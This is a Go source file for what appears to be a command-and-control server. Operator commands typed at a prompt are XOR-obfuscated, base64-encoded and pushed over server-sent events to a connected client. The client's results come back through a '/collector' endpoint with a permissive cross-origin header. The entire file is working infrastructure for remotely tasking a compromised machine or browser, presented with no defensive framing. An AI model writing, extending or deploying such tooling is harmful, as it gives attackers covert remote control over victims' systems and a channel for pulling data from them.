package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
)

var (
	clientChannel   = make(chan bool)
	jobChannel      = make(chan string)
	responseChannel = make(chan []byte)
)

const (
	// Super secure encryption
	xorKey = 42
)

// Start the HTTP server
func startHTTPServer() {
	http.HandleFunc("/collector", postCollectorHandler)
	http.HandleFunc("/sse", sseHandler)
	if err := http.ListenAndServe(":5001", nil); err != nil {
		fmt.Printf("Failed to start HTTP server: %v\n", err)
	}
}

// Handler for collecting responses
func postCollectorHandler(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		fmt.Printf("Failed to read request body: %v\n", err)
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		return
	}

	responseEncoded, err := base64.URLEncoding.DecodeString(string(body))
	if err != nil {
		fmt.Printf("Failed to decode request body: %v\n", err)
		http.Error(w, "Failed to decode request body", http.StatusInternalServerError)
		return
	}

	// Decrypt and send to channel for main to read
	responseDecrypted := xor(responseEncoded)
	responseChannel <- responseDecrypted

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Collected response"))
}

// Handler for server side events
func sseHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	// Client connected
	clientChannel <- true

	for {
		job := <-jobChannel
		fmt.Fprintf(w, "data: %s\n\n", job)
		w.(http.Flusher).Flush()
	}
}

// XOR the data with the key
func xor(data []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ xorKey
	}

	return result
}

func main() {
	fmt.Printf("Starting HTTP server...\n")
	go startHTTPServer()

	fmt.Printf("Waiting for client to connect...\n")
	select {
	// seclect waits for a client to connect
	case <-clientChannel:
		fmt.Printf("Client connected!\n")
	}

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("//> ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("Failed to read command: %v\n", err)
			continue
		}

		// Remove the newlines from the command, according to the OS
		newLineChars := 1
		if runtime.GOOS == "windows" {
			newLineChars = 2
		}

		// Format the command
		commandNoNewline := command[:len(command)-newLineChars]
		xoredCommand := xor([]byte(commandNoNewline))
		urlEncodedCommand := base64.URLEncoding.EncodeToString(xoredCommand)

		// Inform the client via SSE that there is a new job
		jobChannel <- urlEncodedCommand

		select {
		// select waits for the response from the client
		case response := <-responseChannel:
			fmt.Printf("%s\n", response)
		}
	}
}
